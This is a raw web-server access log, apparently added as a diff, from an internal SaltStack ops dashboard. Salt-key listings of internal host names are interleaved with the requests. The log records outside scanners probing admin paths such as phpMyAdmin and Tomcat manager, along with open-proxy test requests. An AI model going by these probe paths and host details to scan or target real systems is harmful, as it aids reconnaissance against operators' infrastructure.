+[21/May/2016 06:33:50] "GET /axis2/axis2-admin/login HTTP/1.1" 404 2674
+Not Found: /manager/html
+[21/May/2016 06:33:56] "GET /manager/html HTTP/1.1" 404 2641
+Not Found: /phpmyadmin/index.php
+[21/May/2016 06:34:10] "GET /phpmyadmin/index.php HTTP/1.1" 404 2665
+Not Found: /phpMyAdmin/index.php
+[21/May/2016 06:34:15] "GET /phpMyAdmin/index.php HTTP/1.1" 404 2665
+Not Found: /pma/index.php
+[21/May/2016 06:34:21] "GET /pma/index.php HTTP/1.1" 404 2644
+Not Found: /pmd/index.php
+[21/May/2016 06:34:25] "GET /pmd/index.php HTTP/1.1" 404 2644
+Not Found: /phpmyadmin/main.php
+[21/May/2016 06:34:30] "GET /phpmyadmin/main.php HTTP/1.1" 404 2662
+Not Found: /phpMyAdmin/main.php
+[21/May/2016 06:34:35] "GET /phpMyAdmin/main.php HTTP/1.1" 404 2662
+Not Found: /pma/main.php
+[21/May/2016 06:34:40] "GET /pma/main.php HTTP/1.1" 404 2641
+Not Found: /pmd/main.php
+[21/May/2016 06:34:45] "GET /pmd/main.php HTTP/1.1" 404 2641
+[21/May/2016 06:56:29] "GET / HTTP/1.1" 200 3204
+[21/May/2016 07:20:59] "GET / HTTP/1.1" 200 3204
+[21/May/2016 07:20:59] "GET /static/css/style.css HTTP/1.1" 200 3639
+[21/May/2016 07:20:59] "GET /static/css/form-elements.css HTTP/1.1" 200 2508
+[21/May/2016 07:20:59] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 21984
+[21/May/2016 07:20:59] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 35951
+[21/May/2016 07:20:59] "GET /static/js/jquery.backstretch.min.js HTTP/1.1" 200 4233
+[21/May/2016 07:20:59] "GET /static/js/scripts.js HTTP/1.1" 200 710
+[21/May/2016 07:20:59] "GET /static/js/jquery-1.11.1.min.js HTTP/1.1" 200 95786
+[21/May/2016 07:20:59] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 117305
+[21/May/2016 07:21:00] "GET /static/font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 200 71508
+[21/May/2016 07:21:00] "GET /static/img/backgrounds/1.jpg HTTP/1.1" 200 170790
+[21/May/2016 07:21:32] "POST / HTTP/1.1" 302 0
+al
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denie[21/May/2016 07:21:33] "GET /index/ HTTP/1.1" 200 9338
+[21/May/2016 07:21:33] "GET /static/css/sb-admin.css HTTP/1.1" 200 3480
+[21/May/2016 07:21:33] "GET /static/img/meitianhui.png HTTP/1.1" 200 7082
+[21/May/2016 07:21:33] "GET /static/js/jquery.js HTTP/1.1" 200 95785
+[21/May/2016 07:21:34] "GET /static/js/echarts.js HTTP/1.1" 200 296800
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 07:29:36] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.google.com/reader/about/
+[21/May/2016 08:06:23] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 1703
+Traceback (most recent call last):
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 86, in run
+    self.finish_response()
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 128, in finish_response
+    self.write(data)
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 212, in write
+    self.send_headers()
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 270, in send_headers
+    self.send_preamble()
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 191, in send_preamble
+    self._write('HTTP/%s %s\r\n' % (self.http_version,self.status))
+  File "/usr/local/python2.7/lib/python2.7/wsgiref/handlers.py", line 391, in _write
+    self.stdout.write(data)
+  File "/usr/local/python2.7/lib/python2.7/socket.py", line 328, in write
+    self.flush()
+  File "/usr/local/python2.7/lib/python2.7/socket.py", line 307, in flush
+    self._sock.sendall(view[write_offset:write_offset+buffer_size])
+error: [Errno 104] Connection reset by peer
+[21/May/2016 08:06:23] "GET http://www.google.com/reader/about/ HTTP/1.1" 500 59
+- Broken pipe from ('91.236.75.4', 34955)
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 09:05:00] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1208461065885739 HTTP/1.1" 404 1736
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 10:18:03] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4545057790883557 HTTP/1.1" 404 1736
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 11:31:51] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3468350928270396 HTTP/1.1" 404 1736
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 11:34:34] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 12:43:47] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1888979968059521 HTTP/1.1" 404 1736
+Not Found: /http:/www.sogou.com/
+[21/May/2016 13:11:22] "GET http://www.sogou.com/?rands=_60767950803945153304560 HTTP/1.1" 404 1691
+Not Found: /http:/www.haosou.com/
+[21/May/2016 13:11:22] "GET http://www.haosou.com/?rands=_940063060013375503878440 HTTP/1.1" 404 1696
+Not Found: /http:/reg.renren.com/
+[21/May/2016 13:11:22] "GET http://reg.renren.com/?rands=_918019980424894723711288 HTTP/1.1" 404 1696
+Not Found: /http:/m.baidu.com/
+[21/May/2016 13:11:22] "GET http://m.baidu.com/?rands=_1469615925501363084241200 HTTP/1.1" 404 1685
+Not Found: /http:/www.kuaidaili.com/
+[21/May/2016 13:11:25] "GET http://www.kuaidaili.com/?rands=_2021414042165965742805148 HTTP/1.1" 404 1709
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 13:31:50] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 13:34:58] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0204709040723085 HTTP/1.1" 404 1736
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 14:52:42] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0054121311982472 HTTP/1.1" 404 1736
+[21/May/2016 15:30:19] "GET /index/ HTTP/1.1" 200 9338
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/May/2016 15:40:11] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[21/May/2016 16:10:35] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3430558621842881 HTTP/1.1" 404 1736
+[21/May/2016 16:43:59] "GET / HTTP/1.1" 200 3204
+[21/May/2016 16:43:59] "GET /static/css/form-elements.css HTTP/1.1" 200 2508
+[21/May/2016 16:43:59] "GET /static/css/style.css HTTP/1.1" 200 3639
+[21/May/2016 16:43:59] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 200 21984
+[21/May/2016 16:43:59] "GET /static/js/jquery.backstretch.min.js HTTP/1.1" 200 4233
+[21/May/2016 16:43:59] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 200 35951
+[21/May/2016 16:43:59] "GET /static/js/jquery-1.11.1.min.js HTTP/1.1" 200 95786
+[21/May/2016 16:43:59] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 200 117305
+[21/May/2016 16:43:59] "GET /static/js/scripts.js HTTP/1.1" 200 710
+[21/May/2016 16:44:00] "GET /static/font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 200 71508
+[21/May/2016 16:44:01] "GET /static/img/backgrounds/1.jpg HTTP/1.1" 200 170790
+[21/May/2016 16:44:01] "GET /static/ico/favicon.png HTTP/1.1" 200 459
+[21/May/2016 16:44:10] "POST / HTTP/1.1" 302 0
+[21/May/2016 16:44:11] "GET /index/ HTTP/1.1" 200 9338
+[21/May/2016 16:44:11] "GET /static/css/sb-admin.css HTTP/1.1" 200 3480
+[21/May/2016 16:44:11] "GET /static/img/meitianhui.png HTTP/1.1" 200 7082
+[21/May/2016 16:44:11] "GET /static/js/jquery.js HTTP/1.1" 200 95785
+[21/May/2016 16:44:11] "GET /static/js/echarts.js HTTP/1.1" 200 296800
+Not Found: /favicon.ico
+[21/May/2016 16:44:13] "GET /favicon.ico HTTP/1.1" 404 2640
+[21/May/2016 16:44:23] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+[21/May/2016 16:44:23] "GET /static/img/wait.gif HTTP/1.1" 200 54292
+[21/May/2016 16:44:38] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10566
+d:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading[21/May/2016 16:45:00] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 9948
+[21/May/2016 16:45:26] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 9905
+[21/May/2016 16:45:48] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 9952
+[21/May/2016 16:45:58] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 7718
+[21/May/2016 16:46:12] "GET /asset/asset/overview HTTP/1.1" 200 8853
+[21/May/2016 16:46:20] "GET /deploy-manage/list_repo_info/ HTTP/1.1" 200 6454
+[21/May/2016 16:46:29] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-maste[21/May/2016 16:46:41] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 11627
+[21/May/2016 16:48:00] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 9991
+[21/May/2016 16:48:07] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 8207
+[21/May/2016 16:48:50] "GET /index/ HTTP/1.1" 200 9338
+[21/May/2016 16:48:53] "GET /saltstack/hosts/deploy/application HTTP/1.1" 200 9738
+[21/May/2016 16:48:58] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9873
+[21/May/2016 16:49:02] "GET /saltstack/hosts/host_info?page=2 HTTP/1.1" 200 9362
+[21/May/2016 16:49:04] "GET /saltstack/hosts/host_info?page=1 HTTP/1.1" 200 9873
+[21/May/2016 16:49:42] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+[21/May/2016 16:49:45] "GET /asset/asset/overview HTTP/1.1" 200 8853
+[21/May/2016 16:49:47] "GET /deploy-manage/list_deploy_info/ HTTP/1.1" 200 6528
+[21/May/2016 16:49:50] "GET /saltstack/hosts/host_info HTTP/1.1" 200 9873
+[21/May/2016 16:49:56] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+[21/May/2016 16:49:59] "GET /saltstack/hosts/list_app_deploy_info HTTP/1.1" 200 6653
+[21/May/2016 16:50:06] "GET /saltstack/hosts/list_app_deploy_info HTTP/1.1" 200 6653
+[21/May/2016 16:50:20] "GET /index/ HTTP/1.1" 200 9338
+Not Found: /http:/www.sogou.com/
+[21/May/2016 16:50:23] "GET http://www.sogou.com/?rands=_1454566182424336516667524 HTTP/1.1" 404 1693
+Not Found: /http:/www.haosou.com/
+[21/May/2016 16:50:23] "GET http://www.haosou.com/?rands=_2287671607419404721378320 HTTP/1.1" 404 1697
+Not Found: /http:/reg.renren.com/
+[21/May/2016 16:50:26] "GET http://reg.renren.com/?rands=_2148374610162030156020 HTTP/1.1" 404 1694
+Not Found: /http:/m.baidu.com/
+[21/May/2016 16:50:29] "GET http://m.baidu.com/?rands=_368068133017430841284304 HTTP/1.1" 404 1684
+Not Found: /http:/www.kuaidaili.com/
+[21/May/2016 16:50:31] "GET http://www.kuaidaili.com/?rands=_897617912019021504497948 HTTP/1.1" 404 1708
+[21/May/2016 16:56:56] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9511
+r
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
